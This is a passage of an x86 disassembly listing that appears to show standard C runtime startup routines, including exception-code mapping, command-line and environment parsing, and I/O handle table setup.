  422f35:	push   eax
  422f36:	call   DWORD PTR ds:0x42806c
  422f3c:	lea    esp,[ebp-0x118]
  422f42:	mov    ecx,DWORD PTR [ebp-0x4]
  422f45:	xor    ecx,DWORD PTR [ebp+0x4]
  422f48:	call   0x42400c
  422f4d:	pop    edi
  422f4e:	pop    esi
  422f4f:	pop    ebx
  422f50:	leave  
  422f51:	ret    
  422f52:	mov    eax,ds:0x45fb9c
  422f57:	cmp    eax,0x1
  422f5a:	je     0x422f69
  422f5c:	test   eax,eax
  422f5e:	jne    0x422f8a
  422f60:	cmp    DWORD PTR ds:0x45f298,0x1
  422f67:	jne    0x422f8a
  422f69:	push   0xfc
  422f6e:	call   0x422ddb
  422f73:	mov    eax,ds:0x45fbe8
  422f78:	test   eax,eax
  422f7a:	pop    ecx
  422f7b:	je     0x422f7f
  422f7d:	call   eax
  422f7f:	push   0xff
  422f84:	call   0x422ddb
  422f89:	pop    ecx
  422f8a:	ret    
  422f8b:	push   ebp
  422f8c:	mov    ebp,esp
  422f8e:	push   ecx
  422f8f:	push   ebx
  422f90:	push   esi
  422f91:	push   edi
  422f92:	call   0x4237f3
  422f97:	mov    edi,DWORD PTR [ebp+0x8]
  422f9a:	mov    esi,eax
  422f9c:	mov    edx,DWORD PTR [esi+0x54]
  422f9f:	mov    eax,ds:0x45f3b4
  422fa4:	mov    ecx,edx
  422fa6:	cmp    DWORD PTR [ecx],edi
  422fa8:	je     0x422fb7
  422faa:	lea    ebx,[eax+eax*2]
  422fad:	add    ecx,0xc
  422fb0:	lea    ebx,[edx+ebx*4]
  422fb3:	cmp    ecx,ebx
  422fb5:	jb     0x422fa6
  422fb7:	lea    eax,[eax+eax*2]
  422fba:	lea    eax,[edx+eax*4]
  422fbd:	cmp    ecx,eax
  422fbf:	jae    0x422fc5
  422fc1:	cmp    DWORD PTR [ecx],edi
  422fc3:	je     0x422fc7
  422fc5:	xor    ecx,ecx
  422fc7:	test   ecx,ecx
  422fc9:	je     0x4230e1
  422fcf:	mov    ebx,DWORD PTR [ecx+0x8]
  422fd2:	test   ebx,ebx
  422fd4:	mov    DWORD PTR [ebp+0x8],ebx
  422fd7:	je     0x4230e1
  422fdd:	cmp    ebx,0x5
  422fe0:	jne    0x422fee
  422fe2:	and    DWORD PTR [ecx+0x8],0x0
  422fe6:	xor    eax,eax
  422fe8:	inc    eax
  422fe9:	jmp    0x4230ea
  422fee:	cmp    ebx,0x1
  422ff1:	je     0x4230dc
  422ff7:	mov    eax,DWORD PTR [esi+0x58]
  422ffa:	mov    DWORD PTR [ebp-0x4],eax
  422ffd:	mov    eax,DWORD PTR [ebp+0xc]
  423000:	mov    DWORD PTR [esi+0x58],eax
  423003:	mov    eax,DWORD PTR [ecx+0x4]
  423006:	cmp    eax,0x8
  423009:	jne    0x4230ce
  42300f:	mov    edx,DWORD PTR ds:0x45f3a8
  423015:	mov    eax,ds:0x45f3ac
  42301a:	add    eax,edx
  42301c:	cmp    edx,eax
  42301e:	jge    0x423047
  423020:	lea    eax,[edx+edx*2]
  423023:	shl    eax,0x2
  423026:	mov    edi,DWORD PTR [esi+0x54]
  423029:	and    DWORD PTR [eax+edi*1+0x8],0x0
  42302e:	mov    edi,DWORD PTR ds:0x45f3a8
  423034:	mov    ebx,DWORD PTR ds:0x45f3ac
  42303a:	inc    edx
  42303b:	add    ebx,edi
  42303d:	add    eax,0xc
  423040:	cmp    edx,ebx
  423042:	jl     0x423026
  423044:	mov    ebx,DWORD PTR [ebp+0x8]
  423047:	mov    ecx,DWORD PTR [ecx]
  423049:	cmp    ecx,0xc000008e
  42304f:	mov    edi,DWORD PTR [esi+0x5c]
  423052:	jne    0x42305d
  423054:	mov    DWORD PTR [esi+0x5c],0x83
  42305b:	jmp    0x4230c1
  42305d:	cmp    ecx,0xc0000090
  423063:	jne    0x42306e
  423065:	mov    DWORD PTR [esi+0x5c],0x81
  42306c:	jmp    0x4230c1
  42306e:	cmp    ecx,0xc0000091
  423074:	jne    0x42307f
  423076:	mov    DWORD PTR [esi+0x5c],0x84
  42307d:	jmp    0x4230c1
  42307f:	cmp    ecx,0xc0000093
  423085:	jne    0x423090
  423087:	mov    DWORD PTR [esi+0x5c],0x85
  42308e:	jmp    0x4230c1
  423090:	cmp    ecx,0xc000008d
  423096:	jne    0x4230a1
  423098:	mov    DWORD PTR [esi+0x5c],0x82
  42309f:	jmp    0x4230c1
  4230a1:	cmp    ecx,0xc000008f
  4230a7:	jne    0x4230b2
  4230a9:	mov    DWORD PTR [esi+0x5c],0x86
  4230b0:	jmp    0x4230c1
  4230b2:	cmp    ecx,0xc0000092
  4230b8:	jne    0x4230c1
  4230ba:	mov    DWORD PTR [esi+0x5c],0x8a
  4230c1:	push   DWORD PTR [esi+0x5c]
  4230c4:	push   0x8
  4230c6:	call   ebx
  4230c8:	pop    ecx
  4230c9:	mov    DWORD PTR [esi+0x5c],edi
  4230cc:	jmp    0x4230d5
  4230ce:	and    DWORD PTR [ecx+0x8],0x0
  4230d2:	push   eax
  4230d3:	call   ebx
  4230d5:	mov    eax,DWORD PTR [ebp-0x4]
  4230d8:	pop    ecx
  4230d9:	mov    DWORD PTR [esi+0x58],eax
  4230dc:	or     eax,0xffffffff
  4230df:	jmp    0x4230ea
  4230e1:	push   DWORD PTR [ebp+0xc]
  4230e4:	call   DWORD PTR ds:0x428078
  4230ea:	pop    edi
  4230eb:	pop    esi
  4230ec:	pop    ebx
  4230ed:	leave  
  4230ee:	ret    
  4230ef:	cmp    DWORD PTR ds:0x46034c,0x0
  4230f6:	jne    0x4230fd
  4230f8:	call   0x42452c
  4230fd:	push   esi
  4230fe:	mov    esi,DWORD PTR ds:0x460354
  423104:	test   esi,esi
  423106:	jne    0x42310f
  423108:	mov    esi,0x4284db
  42310d:	jmp    0x423154
  42310f:	mov    al,BYTE PTR [esi]
  423111:	cmp    al,0x22
  423113:	jne    0x42313d
  423115:	inc    esi
  423116:	mov    al,BYTE PTR [esi]
  423118:	cmp    al,0x22
  42311a:	je     0x42314d
  42311c:	test   al,al
  42311e:	je     0x423136
  423120:	movzx  eax,al
  423123:	push   eax
  423124:	call   0x42404b
  423129:	test   eax,eax
  42312b:	pop    ecx
  42312c:	je     0x42312f
  42312e:	inc    esi
  42312f:	inc    esi
  423130:	mov    al,BYTE PTR [esi]
  423132:	cmp    al,0x22
  423134:	jne    0x42311c
  423136:	cmp    BYTE PTR [esi],0x22
  423139:	jne    0x42314e
  42313b:	jmp    0x42314d
  42313d:	cmp    al,0x20
  42313f:	jbe    0x42314e
  423141:	inc    esi
  423142:	cmp    BYTE PTR [esi],0x20
  423145:	ja     0x423141
  423147:	jmp    0x42314e
  423149:	cmp    al,0x20
  42314b:	ja     0x423154
  42314d:	inc    esi
  42314e:	mov    al,BYTE PTR [esi]
  423150:	test   al,al
  423152:	jne    0x423149
  423154:	mov    eax,esi
  423156:	pop    esi
  423157:	ret    
  423158:	push   ebx
  423159:	xor    ebx,ebx
  42315b:	cmp    DWORD PTR ds:0x46034c,ebx
  423161:	push   esi
  423162:	push   edi
  423163:	jne    0x42316a
  423165:	call   0x42452c
  42316a:	mov    esi,DWORD PTR ds:0x45fb94
  423170:	xor    edi,edi
  423172:	cmp    esi,ebx
  423174:	jne    0x423188
  423176:	jmp    0x4231a8
  423178:	cmp    al,0x3d
  42317a:	je     0x42317d
  42317c:	inc    edi
  42317d:	push   esi
  42317e:	call   0x423f50
  423183:	pop    ecx
  423184:	lea    esi,[esi+eax*1+0x1]
  423188:	mov    al,BYTE PTR [esi]
  42318a:	cmp    al,bl
  42318c:	jne    0x423178
  42318e:	lea    eax,[edi*4+0x4]
  423195:	push   eax
  423196:	call   0x424662
  42319b:	mov    edi,eax
  42319d:	cmp    edi,ebx
  42319f:	pop    ecx
  4231a0:	mov    DWORD PTR ds:0x45fbc4,edi
  4231a6:	jne    0x4231ad
  4231a8:	or     eax,0xffffffff
  4231ab:	jmp    0x423205
  4231ad:	mov    esi,DWORD PTR ds:0x45fb94
  4231b3:	push   ebp
  4231b4:	jmp    0x4231e0
  4231b6:	push   esi
  4231b7:	call   0x423f50
  4231bc:	mov    ebp,eax
  4231be:	inc    ebp
  4231bf:	cmp    BYTE PTR [esi],0x3d
  4231c2:	pop    ecx
  4231c3:	je     0x4231de
  4231c5:	push   ebp
  4231c6:	call   0x424662
  4231cb:	cmp    eax,ebx
  4231cd:	pop    ecx
  4231ce:	mov    DWORD PTR [edi],eax
  4231d0:	je     0x423209
  4231d2:	push   esi
  4231d3:	push   eax
  4231d4:	call   0x423d20
  4231d9:	pop    ecx
  4231da:	pop    ecx
  4231db:	add    edi,0x4
  4231de:	add    esi,ebp
  4231e0:	cmp    BYTE PTR [esi],bl
  4231e2:	jne    0x4231b6
  4231e4:	push   DWORD PTR ds:0x45fb94
  4231ea:	call   0x42454a
  4231ef:	mov    DWORD PTR ds:0x45fb94,ebx
  4231f5:	mov    DWORD PTR [edi],ebx
  4231f7:	mov    DWORD PTR ds:0x460340,0x1
  423201:	xor    eax,eax
  423203:	pop    ecx
  423204:	pop    ebp
  423205:	pop    edi
  423206:	pop    esi
  423207:	pop    ebx
  423208:	ret    
  423209:	push   DWORD PTR ds:0x45fbc4
  42320f:	call   0x42454a
  423214:	mov    DWORD PTR ds:0x45fbc4,ebx
  42321a:	or     eax,0xffffffff
  42321d:	jmp    0x423203
  42321f:	push   ebp
  423220:	mov    ebp,esp
  423222:	push   ecx
  423223:	push   ebx
  423224:	mov    ebx,DWORD PTR [ebp+0xc]
  423227:	xor    edx,edx
  423229:	cmp    DWORD PTR [ebp+0x8],edx
  42322c:	push   edi
  42322d:	mov    DWORD PTR [esi],edx
  42322f:	mov    edi,ecx
  423231:	mov    DWORD PTR [ebx],0x1
  423237:	je     0x423242
  423239:	mov    ecx,DWORD PTR [ebp+0x8]
  42323c:	add    DWORD PTR [ebp+0x8],0x4
  423240:	mov    DWORD PTR [ecx],edi
  423242:	cmp    BYTE PTR [eax],0x22
  423245:	jne    0x423255
  423247:	xor    ecx,ecx
  423249:	test   edx,edx
  42324b:	sete   cl
  42324e:	inc    eax
  42324f:	mov    edx,ecx
  423251:	mov    cl,0x22
  423253:	jmp    0x423282
  423255:	inc    DWORD PTR [esi]
  423257:	test   edi,edi
  423259:	je     0x423260
  42325b:	mov    cl,BYTE PTR [eax]
  42325d:	mov    BYTE PTR [edi],cl
  42325f:	inc    edi
  423260:	mov    cl,BYTE PTR [eax]
  423262:	movzx  ebx,cl
  423265:	inc    eax
  423266:	test   BYTE PTR [ebx+0x460001],0x4
  42326d:	je     0x42327b
  42326f:	inc    DWORD PTR [esi]
  423271:	test   edi,edi
  423273:	je     0x42327a
  423275:	mov    bl,BYTE PTR [eax]
  423277:	mov    BYTE PTR [edi],bl
  423279:	inc    edi
  42327a:	inc    eax
  42327b:	test   cl,cl
  42327d:	mov    ebx,DWORD PTR [ebp+0xc]
  423280:	je     0x4232b4
  423282:	test   edx,edx
  423284:	jne    0x423242
  423286:	cmp    cl,0x20
  423289:	je     0x423290
  42328b:	cmp    cl,0x9
  42328e:	jne    0x423242
  423290:	test   edi,edi
  423292:	je     0x423298
  423294:	and    BYTE PTR [edi-0x1],0x0
  423298:	and    DWORD PTR [ebp-0x4],0x0
  42329c:	cmp    BYTE PTR [eax],0x0
  42329f:	je     0x42337b
  4232a5:	mov    cl,BYTE PTR [eax]
  4232a7:	cmp    cl,0x20
  4232aa:	je     0x4232b1
  4232ac:	cmp    cl,0x9
  4232af:	jne    0x4232b7
  4232b1:	inc    eax
  4232b2:	jmp    0x4232a5
  4232b4:	dec    eax
  4232b5:	jmp    0x423298
  4232b7:	cmp    BYTE PTR [eax],0x0
  4232ba:	je     0x42337b
  4232c0:	cmp    DWORD PTR [ebp+0x8],0x0
  4232c4:	je     0x4232cf
  4232c6:	mov    ecx,DWORD PTR [ebp+0x8]
  4232c9:	add    DWORD PTR [ebp+0x8],0x4
  4232cd:	mov    DWORD PTR [ecx],edi
  4232cf:	inc    DWORD PTR [ebx]
  4232d1:	xor    ebx,ebx
  4232d3:	inc    ebx
  4232d4:	xor    edx,edx
  4232d6:	jmp    0x4232da
  4232d8:	inc    eax
  4232d9:	inc    edx
  4232da:	cmp    BYTE PTR [eax],0x5c
  4232dd:	je     0x4232d8
  4232df:	cmp    BYTE PTR [eax],0x22
  4232e2:	jne    0x42330a
  4232e4:	test   dl,0x1
  4232e7:	jne    0x423308
  4232e9:	cmp    DWORD PTR [ebp-0x4],0x0
  4232ed:	je     0x4232fb
  4232ef:	lea    ecx,[eax+0x1]
  4232f2:	cmp    BYTE PTR [ecx],0x22
  4232f5:	jne    0x4232fb
  4232f7:	mov    eax,ecx
  4232f9:	jmp    0x4232fd
  4232fb:	xor    ebx,ebx
  4232fd:	xor    ecx,ecx
  4232ff:	cmp    DWORD PTR [ebp-0x4],ecx
  423302:	sete   cl
  423305:	mov    DWORD PTR [ebp-0x4],ecx
  423308:	shr    edx,1
  42330a:	test   edx,edx
  42330c:	je     0x42331b
  42330e:	test   edi,edi
  423310:	je     0x423316
  423312:	mov    BYTE PTR [edi],0x5c
  423315:	inc    edi
  423316:	inc    DWORD PTR [esi]
  423318:	dec    edx
  423319:	jne    0x42330e
  42331b:	mov    cl,BYTE PTR [eax]
  42331d:	test   cl,cl
  42331f:	je     0x423369
  423321:	cmp    DWORD PTR [ebp-0x4],0x0
  423325:	jne    0x423331
  423327:	cmp    cl,0x20
  42332a:	je     0x423369
  42332c:	cmp    cl,0x9
  42332f:	je     0x423369
  423331:	test   ebx,ebx
  423333:	je     0x423363
  423335:	test   edi,edi
  423337:	je     0x423352
  423339:	movzx  edx,cl
  42333c:	test   BYTE PTR [edx+0x460001],0x4
  423343:	je     0x42334b
  423345:	mov    BYTE PTR [edi],cl
  423347:	inc    edi
  423348:	inc    eax
  423349:	inc    DWORD PTR [esi]
  42334b:	mov    cl,BYTE PTR [eax]
  42334d:	mov    BYTE PTR [edi],cl
  42334f:	inc    edi
  423350:	jmp    0x423361
  423352:	movzx  ecx,cl
  423355:	test   BYTE PTR [ecx+0x460001],0x4
  42335c:	je     0x423361
  42335e:	inc    eax
  42335f:	inc    DWORD PTR [esi]
  423361:	inc    DWORD PTR [esi]
  423363:	inc    eax
  423364:	jmp    0x4232d1
  423369:	test   edi,edi
  42336b:	je     0x423371
  42336d:	and    BYTE PTR [edi],0x0
  423370:	inc    edi
  423371:	inc    DWORD PTR [esi]
  423373:	mov    ebx,DWORD PTR [ebp+0xc]
  423376:	jmp    0x42329c
  42337b:	mov    eax,DWORD PTR [ebp+0x8]
  42337e:	test   eax,eax
  423380:	je     0x423385
  423382:	and    DWORD PTR [eax],0x0
  423385:	inc    DWORD PTR [ebx]
  423387:	pop    edi
  423388:	pop    ebx
  423389:	leave  
  42338a:	ret    
  42338b:	push   ebp
  42338c:	mov    ebp,esp
  42338e:	push   ecx
  42338f:	push   ecx
  423390:	push   ebx
  423391:	push   esi
  423392:	push   edi
  423393:	xor    edi,edi
  423395:	cmp    DWORD PTR ds:0x46034c,edi
  42339b:	jne    0x4233a2
  42339d:	call   0x42452c
  4233a2:	and    BYTE PTR ds:0x45fcf4,0x0
  4233a9:	push   0x104
  4233ae:	mov    esi,0x45fbf0
  4233b3:	push   esi
  4233b4:	push   edi
  4233b5:	call   DWORD PTR ds:0x428074
  4233bb:	mov    eax,ds:0x460354
  4233c0:	cmp    eax,edi
  4233c2:	mov    DWORD PTR ds:0x45fbd4,esi
  4233c8:	je     0x4233d1
  4233ca:	cmp    BYTE PTR [eax],0x0
  4233cd:	mov    ebx,eax
  4233cf:	jne    0x4233d3
  4233d1:	mov    ebx,esi
  4233d3:	lea    eax,[ebp-0x4]
  4233d6:	push   eax
  4233d7:	push   edi
  4233d8:	lea    esi,[ebp-0x8]
  4233db:	xor    ecx,ecx
  4233dd:	mov    eax,ebx
  4233df:	call   0x42321f
  4233e4:	mov    esi,DWORD PTR [ebp-0x4]
  4233e7:	mov    eax,DWORD PTR [ebp-0x8]
  4233ea:	shl    esi,0x2
  4233ed:	add    eax,esi
  4233ef:	push   eax
  4233f0:	call   0x424662
  4233f5:	mov    edi,eax
  4233f7:	add    esp,0xc
  4233fa:	test   edi,edi
  4233fc:	jne    0x423403
  4233fe:	or     eax,0xffffffff
  423401:	jmp    0x423428
  423403:	lea    eax,[ebp-0x4]
  423406:	push   eax
  423407:	lea    ecx,[esi+edi*1]
  42340a:	push   edi
  42340b:	lea    esi,[ebp-0x8]
  42340e:	mov    eax,ebx
  423410:	call   0x42321f
  423415:	mov    eax,DWORD PTR [ebp-0x4]
  423418:	dec    eax
  423419:	pop    ecx
  42341a:	mov    ds:0x45fbb8,eax
  42341f:	pop    ecx
  423420:	mov    DWORD PTR ds:0x45fbbc,edi
  423426:	xor    eax,eax
  423428:	pop    edi
  423429:	pop    esi
  42342a:	pop    ebx
  42342b:	leave  
  42342c:	ret    
  42342d:	push   ecx
  42342e:	push   ecx
  42342f:	mov    eax,ds:0x45fcf8
  423434:	push   ebx
  423435:	push   ebp
  423436:	push   esi
  423437:	push   edi
  423438:	mov    edi,DWORD PTR ds:0x42808c
  42343e:	xor    ebx,ebx
  423440:	xor    esi,esi
  423442:	cmp    eax,ebx
  423444:	push   0x2
  423446:	pop    ebp
  423447:	jne    0x423476
  423449:	call   edi
  42344b:	mov    esi,eax
  42344d:	cmp    esi,ebx
  42344f:	je     0x42345d
  423451:	mov    DWORD PTR ds:0x45fcf8,0x1
  42345b:	jmp    0x42347b
  42345d:	call   DWORD PTR ds:0x428018
  423463:	cmp    eax,0x78
  423466:	jne    0x423471
  423468:	mov    eax,ebp
  42346a:	mov    ds:0x45fcf8,eax
  42346f:	jmp    0x423476
  423471:	mov    eax,ds:0x45fcf8
  423476:	cmp    eax,0x1
  423479:	jne    0x4234f8
  42347b:	cmp    esi,ebx
  42347d:	jne    0x423487
  42347f:	call   edi
  423481:	mov    esi,eax
  423483:	cmp    esi,ebx
  423485:	je     0x423500
  423487:	cmp    WORD PTR [esi],bx
  42348a:	mov    eax,esi
  42348c:	je     0x42349c
  42348e:	add    eax,ebp
  423490:	cmp    WORD PTR [eax],bx
  423493:	jne    0x42348e
  423495:	add    eax,ebp
  423497:	cmp    WORD PTR [eax],bx
  42349a:	jne    0x42348e
  42349c:	mov    edi,DWORD PTR ds:0x428088
  4234a2:	push   ebx
  4234a3:	push   ebx
  4234a4:	push   ebx
  4234a5:	sub    eax,esi
  4234a7:	push   ebx
  4234a8:	sar    eax,1
  4234aa:	inc    eax
  4234ab:	push   eax
  4234ac:	push   esi
  4234ad:	push   ebx
  4234ae:	push   ebx
  4234af:	mov    DWORD PTR [esp+0x34],eax
  4234b3:	call   edi
  4234b5:	mov    ebp,eax
  4234b7:	cmp    ebp,ebx
  4234b9:	je     0x4234ed
  4234bb:	push   ebp
  4234bc:	call   0x424662
  4234c1:	cmp    eax,ebx
  4234c3:	pop    ecx
  4234c4:	mov    DWORD PTR [esp+0x10],eax
  4234c8:	je     0x4234ed
  4234ca:	push   ebx
  4234cb:	push   ebx
  4234cc:	push   ebp
  4234cd:	push   eax
  4234ce:	push   DWORD PTR [esp+0x24]
  4234d2:	push   esi
  4234d3:	push   ebx
  4234d4:	push   ebx
  4234d5:	call   edi
  4234d7:	test   eax,eax
  4234d9:	jne    0x4234e9
  4234db:	push   DWORD PTR [esp+0x10]
  4234df:	call   0x42454a
  4234e4:	pop    ecx
  4234e5:	mov    DWORD PTR [esp+0x10],ebx
  4234e9:	mov    ebx,DWORD PTR [esp+0x10]
  4234ed:	push   esi
  4234ee:	call   DWORD PTR ds:0x428084
  4234f4:	mov    eax,ebx
  4234f6:	jmp    0x423548
  4234f8:	cmp    eax,ebp
  4234fa:	je     0x423504
  4234fc:	cmp    eax,ebx
  4234fe:	je     0x423504
  423500:	xor    eax,eax
  423502:	jmp    0x423548
  423504:	call   DWORD PTR ds:0x428080
  42350a:	mov    esi,eax
  42350c:	cmp    esi,ebx
  42350e:	je     0x423500
  423510:	cmp    BYTE PTR [esi],bl
  423512:	je     0x42351e
  423514:	inc    eax
  423515:	cmp    BYTE PTR [eax],bl
  423517:	jne    0x423514
  423519:	inc    eax
  42351a:	cmp    BYTE PTR [eax],bl
  42351c:	jne    0x423514
  42351e:	sub    eax,esi
  423520:	inc    eax
  423521:	mov    ebp,eax
  423523:	push   ebp
  423524:	call   0x424662
  423529:	mov    edi,eax
  42352b:	cmp    edi,ebx
  42352d:	pop    ecx
  42352e:	jne    0x423534
  423530:	xor    edi,edi
  423532:	jmp    0x42353f
  423534:	push   ebp
  423535:	push   esi
  423536:	push   edi
  423537:	call   0x424680
  42353c:	add    esp,0xc
  42353f:	push   esi
  423540:	call   DWORD PTR ds:0x42807c
  423546:	mov    eax,edi
  423548:	pop    edi
  423549:	pop    esi
  42354a:	pop    ebp
  42354b:	pop    ebx
  42354c:	pop    ecx
  42354d:	pop    ecx
  42354e:	ret    
  42354f:	sub    esp,0x48
  423552:	push   ebx
  423553:	mov    ebx,0x480
  423558:	push   ebx
  423559:	call   0x424662
  42355e:	test   eax,eax
  423560:	pop    ecx
  423561:	jne    0x42356b
  423563:	or     eax,0xffffffff
  423566:	jmp    0x423748
  42356b:	mov    ds:0x460240,eax
  423570:	mov    DWORD PTR ds:0x460228,0x20
  42357a:	lea    ecx,[eax+0x480]
  423580:	jmp    0x4235a0
  423582:	and    BYTE PTR [eax+0x4],0x0
  423586:	or     DWORD PTR [eax],0xffffffff
  423589:	and    DWORD PTR [eax+0x8],0x0
  42358d:	mov    BYTE PTR [eax+0x5],0xa
  423591:	mov    ecx,DWORD PTR ds:0x460240
  423597:	add    eax,0x24
  42359a:	add    ecx,0x480
  4235a0:	cmp    eax,ecx
  4235a2:	jb     0x423582
  4235a4:	push   ebp
  4235a5:	push   esi
  4235a6:	push   edi
  4235a7:	lea    eax,[esp+0x14]
  4235ab:	push   eax
  4235ac:	call   DWORD PTR ds:0x428058
  4235b2:	cmp    WORD PTR [esp+0x46],0x0
  4235b8:	je     0x4236a7
  4235be:	mov    eax,DWORD PTR [esp+0x48]
  4235c2:	test   eax,eax
  4235c4:	je     0x4236a7
  4235ca:	mov    edi,DWORD PTR [eax]
  4235cc:	lea    ebp,[eax+0x4]
  4235cf:	lea    eax,[edi+ebp*1]
  4235d2:	mov    DWORD PTR [esp+0x10],eax
  4235d6:	mov    eax,0x800
  4235db:	cmp    edi,eax
  4235dd:	jl     0x4235e1
  4235df:	mov    edi,eax
  4235e1:	cmp    DWORD PTR ds:0x460228,edi
  4235e7:	jge    0x423637
  4235e9:	mov    esi,0x460244
  4235ee:	push   ebx
  4235ef:	call   0x424662
  4235f4:	test   eax,eax
  4235f6:	pop    ecx
  4235f7:	je     0x423631
  4235f9:	add    DWORD PTR ds:0x460228,0x20
  423600:	mov    DWORD PTR [esi],eax
  423602:	lea    ecx,[eax+0x480]
  423608:	jmp    0x423620
  42360a:	and    BYTE PTR [eax+0x4],0x0
  42360e:	or     DWORD PTR [eax],0xffffffff
  423611:	and    DWORD PTR [eax+0x8],0x0
  423615:	mov    BYTE PTR [eax+0x5],0xa
  423619:	mov    ecx,DWORD PTR [esi]
  42361b:	add    eax,0x24
  42361e:	add    ecx,ebx
  423620:	cmp    eax,ecx
  423622:	jb     0x42360a
  423624:	add    esi,0x4
  423627:	cmp    DWORD PTR ds:0x460228,edi
  42362d:	jl     0x4235ee
  42362f:	jmp    0x423637
  423631:	mov    edi,DWORD PTR ds:0x460228
  423637:	xor    ebx,ebx
  423639:	test   edi,edi
  42363b:	jle    0x4236a7
  42363d:	mov    eax,DWORD PTR [esp+0x10]
  423641:	mov    eax,DWORD PTR [eax]
  423643:	cmp    eax,0xffffffff
  423646:	je     0x42369c
  423648:	mov    cl,BYTE PTR [ebp+0x0]
  42364b:	test   cl,0x1
  42364e:	je     0x42369c
  423650:	test   cl,0x8
  423653:	jne    0x423660
  423655:	push   eax
  423656:	call   DWORD PTR ds:0x428094
  42365c:	test   eax,eax
  42365e:	je     0x42369c
  423660:	mov    ecx,ebx
  423662:	mov    eax,ebx
  423664:	and    eax,0x1f
  423667:	lea    eax,[eax+eax*8]
  42366a:	sar    ecx,0x5
  42366d:	mov    ecx,DWORD PTR [ecx*4+0x460240]
  423674:	lea    esi,[ecx+eax*4]
  423677:	mov    eax,DWORD PTR [esp+0x10]
  42367b:	mov    eax,DWORD PTR [eax]
  42367d:	mov    DWORD PTR [esi],eax
  42367f:	mov    al,BYTE PTR [ebp+0x0]
  423682:	mov    BYTE PTR [esi+0x4],al
  423685:	lea    eax,[esi+0xc]
  423688:	push   0xfa0
  42368d:	push   eax
  42368e:	call   0x4249cd
  423693:	test   eax,eax
  423695:	pop    ecx
  423696:	pop    ecx
  423697:	je     0x4236c7
  423699:	inc    DWORD PTR [esi+0x8]
  42369c:	add    DWORD PTR [esp+0x10],0x4
  4236a1:	inc    ebx
  4236a2:	inc    ebp
  4236a3:	cmp    ebx,edi
  4236a5:	jl     0x42363d
  4236a7:	xor    ebx,ebx
  4236a9:	mov    ecx,DWORD PTR ds:0x460240
  4236af:	lea    eax,[ebx+ebx*8]
  4236b2:	lea    esi,[ecx+eax*4]
  4236b5:	cmp    DWORD PTR [esi],0xffffffff
  4236b8:	jne    0x423729
  4236ba:	test   ebx,ebx
  4236bc:	mov    BYTE PTR [esi+0x4],0x81
  4236c0:	jne    0x4236cc
  4236c2:	push   0xfffffff6
  4236c4:	pop    eax
  4236c5:	jmp    0x4236d6
  4236c7:	or     eax,0xffffffff
  4236ca:	jmp    0x423745
  4236cc:	mov    eax,ebx
  4236ce:	dec    eax
  4236cf:	neg    eax
  4236d1:	sbb    eax,eax
  4236d3:	add    eax,0xfffffff5
  4236d6:	push   eax
  4236d7:	call   DWORD PTR ds:0x428070
  4236dd:	mov    edi,eax
  4236df:	cmp    edi,0xffffffff
  4236e2:	je     0x423723
  4236e4:	push   edi
  4236e5:	call   DWORD PTR ds:0x428094
  4236eb:	test   eax,eax
  4236ed:	je     0x423723
  4236ef:	and    eax,0xff
  4236f4:	cmp    eax,0x2
  4236f7:	mov    DWORD PTR [esi],edi
  4236f9:	jne    0x423701
  4236fb:	or     BYTE PTR [esi+0x4],0x40
  4236ff:	jmp    0x42370a
  423701:	cmp    eax,0x3
  423704:	jne    0x42370a
  423706:	or     BYTE PTR [esi+0x4],0x8
  42370a:	lea    eax,[esi+0xc]
  42370d:	push   0xfa0
  423712:	push   eax
  423713:	call   0x4249cd
  423718:	test   eax,eax
  42371a:	pop    ecx
  42371b:	pop    ecx
  42371c:	je     0x4236c7
  42371e:	inc    DWORD PTR [esi+0x8]
  423721:	jmp    0x42372d
  423723:	or     BYTE PTR [esi+0x4],0x40
  423727:	jmp    0x42372d
  423729:	or     BYTE PTR [esi+0x4],0x80
  42372d:	inc    ebx
  42372e:	cmp    ebx,0x3
  423731:	jl     0x4236a9
  423737:	push   DWORD PTR ds:0x460228
  42373d:	call   DWORD PTR ds:0x428090
  423743:	xor    eax,eax
  423745:	pop    edi
  423746:	pop    esi
  423747:	pop    ebp
  423748:	pop    ebx
  423749:	add    esp,0x48
  42374c:	ret    
  42374d:	push   0xc
  42374f:	push   0x4284e0
  423754:	call   0x423940
  423759:	mov    DWORD PTR [ebp-0x1c],0x428f38
  423760:	cmp    DWORD PTR [ebp-0x1c],0x428f38
  423767:	jae    0x42378b
  423769:	and    DWORD PTR [ebp-0x4],0x0
  42376d:	mov    eax,DWORD PTR [ebp-0x1c]
  423770:	mov    eax,DWORD PTR [eax]
  423772:	test   eax,eax
  423774:	je     0x423781
  423776:	call   eax
  423778:	jmp    0x423781
  42377a:	xor    eax,eax
  42377c:	inc    eax
  42377d:	ret    
  42377e:	mov    esp,DWORD PTR [ebp-0x18]
  423781:	or     DWORD PTR [ebp-0x4],0xffffffff
  423785:	add    DWORD PTR [ebp-0x1c],0x4
  423789:	jmp    0x423760
  42378b:	call   0x42397b
  423790:	ret    
  423791:	push   0xc
  423793:	push   0x4284f0
  423798:	call   0x423940
  42379d:	mov    DWORD PTR [ebp-0x1c],0x428f40
  4237a4:	cmp    DWORD PTR [ebp-0x1c],0x428f40
  4237ab:	jae    0x4237cf
  4237ad:	and    DWORD PTR [ebp-0x4],0x0
  4237b1:	mov    eax,DWORD PTR [ebp-0x1c]
  4237b4:	mov    eax,DWORD PTR [eax]
  4237b6:	test   eax,eax
  4237b8:	je     0x4237c5
  4237ba:	call   eax
  4237bc:	jmp    0x4237c5
  4237be:	xor    eax,eax
  4237c0:	inc    eax
  4237c1:	ret    
  4237c2:	mov    esp,DWORD PTR [ebp-0x18]
  4237c5:	or     DWORD PTR [ebp-0x4],0xffffffff
  4237c9:	add    DWORD PTR [ebp-0x1c],0x4
  4237cd:	jmp    0x4237a4
  4237cf:	call   0x42397b
  4237d4:	ret    
  4237d5:	call   0x423a16
  4237da:	mov    eax,ds:0x45f3dc
  4237df:	cmp    eax,0xffffffff
  4237e2:	je     0x4237f2
  4237e4:	push   eax
  4237e5:	call   DWORD PTR ds:0x42809c
  4237eb:	or     DWORD PTR ds:0x45f3dc,0xffffffff
  4237f2:	ret    
  4237f3:	push   ebx
  4237f4:	push   esi
  4237f5:	call   DWORD PTR ds:0x428018
  4237fb:	push   DWORD PTR ds:0x45f3dc
  423801:	mov    ebx,eax
  423803:	call   DWORD PTR ds:0x4280ac
  423809:	mov    esi,eax
  42380b:	test   esi,esi
  42380d:	jne    0x423858
  42380f:	push   0x88
  423814:	push   0x1
  423816:	call   0x424a58
  42381b:	mov    esi,eax
  42381d:	test   esi,esi
  42381f:	pop    ecx
  423820:	pop    ecx
  423821:	je     0x423850
  423823:	push   esi
  423824:	push   DWORD PTR ds:0x45f3dc
